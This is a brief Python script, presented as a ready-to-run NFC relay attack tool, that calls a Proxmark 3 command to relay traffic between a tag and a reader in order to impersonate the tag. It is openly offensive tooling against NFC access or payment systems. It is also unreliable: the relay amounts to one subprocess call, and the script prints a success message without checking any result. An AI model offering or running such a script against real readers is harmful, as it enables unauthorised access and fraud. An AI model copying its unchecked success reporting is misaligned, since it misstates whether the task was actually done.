# -------------------------------------------
# NFC Relay Attack Using Proxmark 3
# -------------------------------------------
# Functionality:
# - Performs a man-in-the-middle NFC relay attack.
# - Intercepts and relays communication between an NFC tag and reader to impersonate the tag.

# Devices being used:
# - Proxmark 3: Intercepts and relays NFC communication to impersonate the tag.

# Example Usage:
# 1. Run the script to perform a NFC relay attack:
#    python nfc_relay_attack.py

import subprocess

def perform_nfc_relay():
    """
    Perform an NFC relay attack where Proxmark 3 relays communication between an NFC reader and tag.
    """
    print("[+] Performing NFC relay attack...")
    subprocess.run(["proxmark3", "hf", "relay"])  # Relay the NFC communication
    print("[✔] NFC relay attack completed successfully.")

def main():
    """
    Main function to execute the NFC relay attack.
    """
    perform_nfc_relay()  # Start the NFC relay attack

# Run the script
if __name__ == "__main__":
    main()
